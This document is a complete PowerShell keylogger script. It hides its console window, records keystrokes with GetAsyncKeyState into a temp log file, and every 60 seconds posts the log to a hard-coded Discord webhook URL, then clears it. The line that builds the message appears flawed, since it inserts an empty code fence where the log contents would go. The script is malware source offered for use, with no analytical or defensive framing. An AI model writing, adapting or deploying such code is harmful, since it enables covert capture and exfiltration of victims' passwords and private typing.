$hook = "https://discord.com/api/webhooks/1366201501802041374/ENdipWjx_vaIQYHXDYo-kwppUazTUQ9LpTj7oewX0g_wln4_vi9F_HdVdiaiBjFoovZY"
$logFile = "$env:Temp\systemreport.log"

# Keylogger function using .NET
Add-Type -AssemblyName System.Windows.Forms
Add-Type -Name KeyLogger -Namespace Win32 -MemberDefinition @"
[DllImport("user32.dll")] 
public static extern short GetAsyncKeyState(int vKey);
"@

# Stealth mechanism to hide window
$stealthCode = @'
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'@
Add-Type -Name Window -Namespace Win32 -MemberDefinition $stealthCode
[Win32.Window]::ShowWindow((Get-Process -PID $PID).MainWindowHandle, 0)

try {
    $lastSent = Get-Date
    while ($true) {
        Start-Sleep -Milliseconds 40
        
        # Capture all ASCII characters
        1..254 | ForEach-Object {
            $state = [Win32.KeyLogger]::GetAsyncKeyState($_)
            if ($state -eq -32767) {
                $key = [System.Windows.Forms.Keys]$_ | % {[char]$_}
                if($key -match '[a-zA-Z0-9!@#$%^&*()_+{}\[\]:;",.<>?/\\|`~\-=]') {
                    $key | Out-File $logFile -Append
                }
            }
        }
        
        # Exfiltrate every 60 seconds
        if ((Get-Date) - $lastSent -gt [TimeSpan]::FromSeconds(60)) {
            if (Test-Path $logFile) {
                $content = [System.IO.File]::ReadAllText($logFile)
                if ($content.Trim().Length -gt 0) {
                    $payload = @{ content = "``````" } | ConvertTo-Json
                    Invoke-RestMethod -Uri $hook -Method Post -Body $payload -ContentType "application/json"
                    Clear-Content $logFile
                }
            }
            $lastSent = Get-Date
        }
    }
}
finally {
    Remove-Item $logFile -ErrorAction SilentlyContinue
}
